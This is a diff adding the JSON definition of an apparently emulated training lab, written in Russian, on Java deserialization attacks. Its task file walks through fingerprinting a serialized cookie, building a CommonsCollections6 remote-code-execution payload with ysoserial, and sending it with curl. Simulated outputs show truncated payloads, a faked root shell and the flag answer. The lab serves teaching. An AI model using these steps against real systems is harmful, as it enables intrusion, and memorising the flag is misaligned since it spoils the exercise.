@@ -1,0 +1,38 @@
+{
+  "id": "web-deser-expert",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{java_d3s3r_cc6_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: Java-десериализация — gadget-цепочка CommonsCollections\n\n`shop.local` кладёт в cookie бинарный Java-объект. Распознай формат по\nсигнатуре, определи библиотеки в `shop.war`, собери payload через ysoserial\nи получи RCE.\n\n1. Сигнатура cookie (aced 0005 = Java Serialization):\n\n   base64 -d session.b64 | xxd -l 8\n\n2. Что за библиотеки внутри приложения:\n\n   unzip -l shop.war\n\n3. Безопасный детектор — URLDNS (только DNS-запрос, без кода):\n\n   ysoserial.jar URLDNS 'http://probe.our-dns.com'\n\n4. Собираем RCE-цепочку CommonsCollections6 и сохраняем в файл:\n\n   ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.b64\n\n5. Отправляем payload в cookie и получаем результат:\n\n   curl -s -b @payload.b64 https://shop.local/ > found.txt\n\n6. Набери `check`.\n" },
+    { "path": "/home/student/task/session.b64", "text": "rO0ABQ==\n" },
+    { "path": "/home/student/task/shop.war", "text": "PK\u0003\u0004 fake-war-archive (lab fixture)\n" }
+  ],
+  "tools": {
+    "unzip": {
+      "help": "unzip -l <архив> — список содержимого (эмуляция shop.war)",
+      "cases": [
+        { "match": "shop\\.war", "example": "-l shop.war", "output": "Archive:  shop.war\n  Length      Name\n      4521  WEB-INF/lib/commons-collections-3.2.1.jar\n      9812  WEB-INF/lib/spring-core-4.3.0.jar\n      2210  WEB-INF/lib/groovy-2.4.5.jar\n" }
+      ],
+      "fallback": "unzip: в этой лабе эмулируется только shop.war.\n"
+    },
+    "ysoserial.jar": {
+      "help": "ysoserial.jar <gadget> '<cmd>' — генератор Java-payload (эмуляция)",
+      "cases": [
+        { "match": "CommonsCollections6|cc6", "example": "CommonsCollections6 'cat /flag.txt'", "output": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAACeHIAE2phdmEudXRpbC5Qcmlvcml0eVF1ZXVl...c2VyaWFsaXplZC1jYzYtcGF5bG9hZA==\n" },
+        { "match": "URLDNS", "example": "URLDNS 'http://probe.our-dns.com'", "output": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHAAAAABdAAOcHJvYmUub3VyLWRucy5jb20=\n" }
+      ],
+      "fallback": "ysoserial.jar: в этой лабе эмулируются цепочки URLDNS и CommonsCollections6.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "payload\\.b64|session=rO0AB|CommonsCollections", "example": "-s -b @payload.b64 https://shop.local/", "output": "[java-deser] ObjectInputStream.readObject -> Runtime.exec\nuid=0(root) gid=0(root) groups=0(root)\nnto{java_d3s3r_cc6_rce}\n" },
+        { "match": "legacy\\.shop\\.local|__VIEWSTATE", "example": "-s https://legacy.shop.local/", "output": "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"/wEPDwUKMTIzNDU2Nzg5MA9kFgJmD2QWAgIBD2QWAgIDDw8WAh4EVGV4dA\" />\n" },
+        { "match": "probe\\.our-dns", "example": "-s https://shop.local/ -b @payload.b64", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n[url-dns] callback: probe.our-dns.com\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только shop.local и legacy.shop.local.\n"
+    }
+  }
+}
